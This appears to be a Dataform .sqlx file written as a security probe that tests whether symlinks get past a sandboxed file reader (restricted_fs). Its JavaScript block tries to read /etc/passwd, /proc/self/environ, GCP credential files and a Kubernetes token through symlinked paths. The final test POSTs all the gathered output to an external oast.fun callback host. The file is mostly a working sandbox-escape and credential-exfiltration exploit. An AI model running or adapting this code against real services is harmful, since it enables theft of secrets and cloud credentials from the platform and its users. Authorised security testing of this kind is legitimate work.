-- Symlink Attack Test
-- Tests if symlinks bypass restricted_fs bounds checking via TOCTOU
-- Theory: restricted_fs validates symlink PATH, but OS follows to TARGET

config {
  type: "view",
  name: "symlink_test"
}

js {
  let results = [];

  // Test 1: Direct read of symlinked .sqlx file via restricted_fs
  try {
    const content = restricted_fs.readFile("definitions/passwd_leak.sqlx");
    results.push("1_passwd_direct: SUCCESS len=" + content.length + " content=" + content.substring(0, 200));
  } catch(e) {
    results.push("1_passwd_direct: FAIL - " + e.message);
  }

  // Test 2: Read hostname symlink
  try {
    const content = restricted_fs.readFile("definitions/hostname_leak.sqlx");
    results.push("2_hostname: SUCCESS - " + content.substring(0, 100));
  } catch(e) {
    results.push("2_hostname: FAIL - " + e.message);
  }

  // Test 3: Read environ symlink (Linux /proc/self/environ)
  try {
    const content = restricted_fs.readFile("definitions/environ_leak.sqlx");
    results.push("3_environ: SUCCESS len=" + content.length + " - " + content.substring(0, 200));
  } catch(e) {
    results.push("3_environ: FAIL - " + e.message);
  }

  // Test 4: Try require() on symlinked JS file
  try {
    const inc = require("./includes/passwd.js");
    results.push("4_require_passwd: SUCCESS - " + String(inc).substring(0, 200));
  } catch(e) {
    results.push("4_require_passwd: FAIL - " + e.message);
  }

  // Test 5: Check if symlinks exist according to restricted_fs
  try {
    const exists1 = restricted_fs.exists("definitions/passwd_leak.sqlx");
    const exists2 = restricted_fs.exists("definitions/hostname_leak.sqlx");
    const isDir1 = restricted_fs.isDirectory("definitions/passwd_leak.sqlx");
    results.push("5_exists_check: passwd=" + exists1 + ", hostname=" + exists2 + ", isDir=" + isDir1);
  } catch(e) {
    results.push("5_exists_check: FAIL - " + e.message);
  }

  // Test 6: Try to read via path module manipulation
  try {
    const p = path;
    const normalized = "definitions/passwd_leak.sqlx";
    results.push("6_path_module: " + typeof p + " keys=" + Object.keys(p || {}).join(","));
    if (p && p.resolve) {
      results.push("6_resolved: " + p.resolve(normalized));
    }
  } catch(e) {
    results.push("6_path_module: FAIL - " + e.message);
  }

  // Test 7: Try different path variations to the symlink
  const variations = [
    "definitions/passwd_leak.sqlx",
    "./definitions/passwd_leak.sqlx",
    "definitions//passwd_leak.sqlx",
    "definitions/./passwd_leak.sqlx"
  ];
  for (let i = 0; i < variations.length; i++) {
    try {
      const content = restricted_fs.readFile(variations[i]);
      results.push("7_var" + i + ": SUCCESS len=" + content.length);
    } catch(e) {
      results.push("7_var" + i + ": FAIL - " + e.message.substring(0, 50));
    }
  }

  // Test 8: Check what the file content looks like (if it's symlink metadata or actual content)
  try {
    const content = restricted_fs.readFile("definitions/passwd_leak.sqlx");
    // Check if content looks like /etc/passwd format (user:x:uid:gid:...)
    const looksLikePasswd = content.includes(":x:") || content.includes("root:");
    const firstLine = content.split("\n")[0];
    results.push("8_content_analysis: looksLikePasswd=" + looksLikePasswd + " firstLine=" + firstLine);
  } catch(e) {
    results.push("8_content_analysis: FAIL - " + e.message);
  }

  // Test 9: GCP credential symlinks
  const gcpPaths = [
    "definitions/gcp_creds.sqlx",
    "definitions/k8s_token.sqlx",
    "definitions/gcp_db.sqlx"
  ];
  for (const p of gcpPaths) {
    try {
      const content = restricted_fs.readFile(p);
      results.push("9_" + p.split("/")[1] + ": SUCCESS len=" + content.length + " - " + content.substring(0, 100));
    } catch(e) {
      results.push("9_" + p.split("/")[1] + ": FAIL - " + e.message.substring(0, 80));
    }
  }

  // Test 10: Network callback with any leaked data
  try {
    const https = require('https');
    const data = JSON.stringify({symlink_results: results});
    const req = https.request({
      hostname: 'juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun',
      path: '/symlink',
      method: 'POST',
      headers: {'Content-Type': 'application/json'}
    });
    req.write(data);
    req.end();
    results.push("10_oast_callback: ATTEMPTED");
  } catch(e) {
    results.push("10_oast_callback: FAIL - " + e.message);
  }
}

SELECT
  '${JSON.stringify(results)}' as symlink_results
